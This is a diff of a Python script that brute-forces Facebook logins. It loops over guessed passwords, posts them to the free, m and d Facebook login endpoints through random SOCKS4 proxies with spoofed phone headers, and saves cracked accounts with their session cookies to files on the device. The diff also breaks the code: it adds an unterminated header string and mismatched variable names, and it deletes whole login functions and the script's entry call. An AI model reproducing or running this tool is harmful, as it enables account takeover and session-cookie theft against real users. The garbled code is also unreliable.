@@ -1314,7 +1314,7 @@ def ANOX1():
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
-	print('[✓] CRACKING COMPLETED ')
+	print('[✓] 4 COMPLETED ')
 	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
 	input("DO YOU WANT TO GO BSCK MENU ")
@@ -1733,25 +1733,26 @@ def p(uid,pwx,tl):
 				open('/sdcard/ANOX-OK.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
+#created by anox aka country chaudhary
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anox-cp] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M2-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[m2-anox] %s|ok:%s cp:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1765,7 +1766,7 @@ def x(uid,pwx,tl):
 		for ps in pwx:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			session = requests.Session()
+			session = requests.session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
@@ -1777,63 +1778,62 @@ def x(uid,pwx,tl):
 			"unrecognized_tries":"0",
 			"email":uid,
 			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'Host': 'free.facebook.com',#FREE METHOD 
-            'method':'POST',
+			"login":"log in"}
+			header_freefb = {'host': 'free.facebook.com',#free method 
+            'method':'post',
             'scheme':'https',
     'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3XOQZbE_7TrxZfBpBBSrrvLb; sb=3XOQZUxRpAqUvuRhMS8caYbJ; m_pixel_ratio=2.75; wd=393x720; fr=0P7haYQ8gqgcvw8JW..BlkHPd.BM.AAA.0.0.BlkHQO.AWVY9lxQjpg',
+    'accept-language': 'en-in,en-gb;q=0.9,en-us;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0() 
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    'sec-ch-ua': '"not_a brand";v="8", "chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"not_a brand";v="8.0.0.0", "chromium";v="120.0.6099.26"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-model': '"redmi note 8 pro"',
+    'sec-ch-ua-platform': '"android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
+    'user-agent': 'mozilla/5.0 (linux; android 10; k) applewebkit/537.36 (khtml, like gecko) chrome/120.0.0.0 mobile safari/537.36',}
 			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in ANOX_xd:
-					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
+				print('\33[1;92m[anox-ok] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anox_xd:
+					print("\33[1;92m[💚] \33[1;98mcookies : \33[1;92m"+coki)
 					
 				else:
 					break
-				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/anox-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anox-cp] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anox-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M2-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[m2-anox] %s|ok:%s cp:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1847,7 +1847,7 @@ def mobile(uid,pwx,tl):
 		for ps in pwx:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			session = requests.Session()
+			session = requests.session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://m.facebook.com').text
 			log_data = {
@@ -1859,226 +1859,4 @@ def mobile(uid,pwx,tl):
 			"unrecognized_tries":"0",
 			"email":uid,
 			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority': 'x.facebook.com',
-			'method':'POST',
-            'scheme':'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    'dpr': '2.75',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
-			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[151:166]
-				print('\r\033[1;32m[ANOX-OK]\033[1;37m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
-				if 'y' in ANOX_xd:
-					print("\33[1;93m[🥵] \33[1;97m[NUMBER ]: \33[1;96m"+uid)
-					print("\33[1;93m[😎] \33[1;92m[COOKIES ]: \33[1;92m"+coki)
-					cek_apk(session,coki)
-				else:
-					break
-				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
-				oks.append(cid)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[141:156]
-				if 'y' in baby:
-					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-					cps.append(cid)
-					break
-				else:
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-					break
-				
-				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-		sys.stdout.write('\r\33[1;37m[M4-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
-		sys.stdout.flush()
-	except:
-		pass
-
-def free(uid,pwx,tl):
-	global loop
-	global oks
-	global cps
-	global ugen
-	try:
-		for ps in pwx:
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			session = requests.Session()
-			pro = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
-#FREE method 
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority': 'free.facebook.com/',			
-            'method': 'POST',         
-			'scheme': 'https',			
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'save-data': 'on',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"vivo 1901"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
-			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[151:166]
-				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in ANOX_xd:
-					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
-					
-				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
-				oks.append(cid)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[141:156]
-				if 'y' in baby:
-					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+'|'+ps+'\n')
-					cps.append(cid)
-					break
-				else:
-					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-					break
-				
-				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-		sys.stdout.write('\r\33[1;37m[M5-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
-		sys.stdout.flush()
-	except:
-		pass
-
-def d(uid,pwx,tl):
-	global loop
-	global oks
-	global cps
-	global ugen
-	try:
-		for ps in pwx:
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			session = requests.Session()
-			pro = random.choice(ugen)
-			free_fb = session.get('https://d.facebook.com').text
-#D method
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb ={'authority': 'd.facebook.com/',			
-            'method': 'POST',         
-			'scheme': 'https',			
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'save-data': 'on',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"vivo 1901"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
-			lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[151:166]
-				print('\33[1;92m[ANOX-OK] '+uid+' | '+ps+'\33[0;97m')
-				if 'y' in ANOX_xd:
-					print("\33[0;97m[💚] \33[1;98mCOOKIES : \33[0;97m"+coki)
-					cek_apk(session,coki)
-				else:
-					break
-				open('/sdcard/ANOX-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
-				oks.append(uid)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[141:156]
-				if 'y' in baby:
-					print('\33[1;91m[ANOX-CP] '+uid+'|'+ps+'\33[0;97m')
-					open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
-					cps.append(uid)
-					break
-				else:
-					open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
-					break
-				
-				open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-		sys.stdout.write('\r\33[1;37m[M6-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
-		sys.stdout.flush()
-	except:
-		pass
-
-ANOX()
+			"login":"log in"}
